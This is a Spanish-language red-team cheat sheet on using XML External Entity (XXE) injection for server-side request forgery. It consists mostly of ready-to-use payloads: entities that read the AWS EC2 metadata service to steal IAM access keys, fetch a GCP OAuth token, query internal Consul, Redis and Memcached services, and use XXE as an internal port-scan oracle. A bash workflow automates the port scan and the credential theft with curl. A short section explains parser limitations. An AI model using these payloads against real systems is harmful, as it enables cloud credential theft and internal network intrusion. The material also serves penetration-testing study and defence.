---
aliases: null
tags:
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
tertiary categories:
  - '[[Web Explotación]]'
kind: SubCheatSheet
linked:
  - '[[XML External Entity (XXE)]]'
---
# XXE - Clásico SSRF

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&x;</foo>` | Listado de metadata AWS EC2 (IMDSv1) | Target en EC2, IMDS sin token. |
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&x;</foo>` | Nombre del rol IAM | Step previo a robar AccessKey+Secret. |
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">]><foo>&x;</foo>` | AccessKey + Secret + Token IAM | Después de obtener el rol. |
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]><foo>&x;</foo>` | OAuth token GCP service account | Target en GCP. Requiere header `Metadata-Flavor: Google` (no controlable acá → falla en parsers HTTP-only). |
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin/dashboard">]><foo>&x;</foo>` | Contenido del admin panel internal | Servicio interno con trust en localhost. |
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "http://127.0.0.1:8500/v1/kv/?recurse">]><foo>&x;</foo>` | Dump del KV store de Consul | Discovery de servicios internos. |
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "http://192.168.0.1:22/">]><foo>&x;</foo>` | Banner SSH si puerto abierto, error de conexión si cerrado | Oráculo de portscan interno. |
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "gopher://127.0.0.1:6379/_INFO%0d%0a">]><foo>&x;</foo>` | Output de `INFO` de Redis | Backend Java, gopher habilitado, Redis sin auth. |
| `<!DOCTYPE foo [<!ENTITY x SYSTEM "dict://127.0.0.1:11211/stats">]><foo>&x;</foo>` | Stats de Memcached | Backend con `dict://` (libcurl-based). |
^xxe-clasico-ssrf

### Workflow rápido

```bash
# 1. Portscan interno usando XXE como oráculo
for port in 22 80 443 3306 6379 8080 8500 9200; do
  RES=$(curl -s -o /dev/null -w '%{time_total}' -X POST https://target/api \
    -H 'Content-Type: application/xml' \
    --data "<!DOCTYPE foo [<!ENTITY x SYSTEM \"http://127.0.0.1:$port/\">]><foo>&x;</foo>")
  echo "Port $port: ${RES}s"
done
# Diferencia de tiempos: abierto vs cerrado vs filtered

# 2. AWS IMDSv1 — robo de credenciales IAM
curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
  '<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&x;</foo>'
# → nombre del rol; después:
curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
  '<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">]><foo>&x;</foo>'
```

___

## Overview

Si el valor de la entidad externa es una URL HTTP/HTTPS (en vez de `file://`), el parser actúa como cliente HTTP del backend → [[Server-Side Request Forgery (SSRF)]]. El cuerpo de la respuesta interna queda embebido en el nodo XML y se refleja en la respuesta HTTP de la app.

### Limitaciones

- **Soporte de esquemas:** `http`/`https` son universales. `gopher`, `dict`, `ftp`, `jar` dependen del parser/lenguaje (Java tiende a aceptarlos, Python `lxml` no).
- **Headers fijos:** la entidad no permite custom headers. IMDSv2 (`X-aws-ec2-metadata-token`) y GCP metadata (`Metadata-Flavor: Google`) bloquean por esa razón.
- **Métodos:** solo `GET`. Sin POST/PUT/DELETE — limita exploits a endpoints idempotentes.
- **Caracteres XML-rompedores:** si la respuesta interna contiene `<`/`&`, parser falla → pivotar a [[XXE - Out-of-Band (OOB) y DTDs Externos]].

***
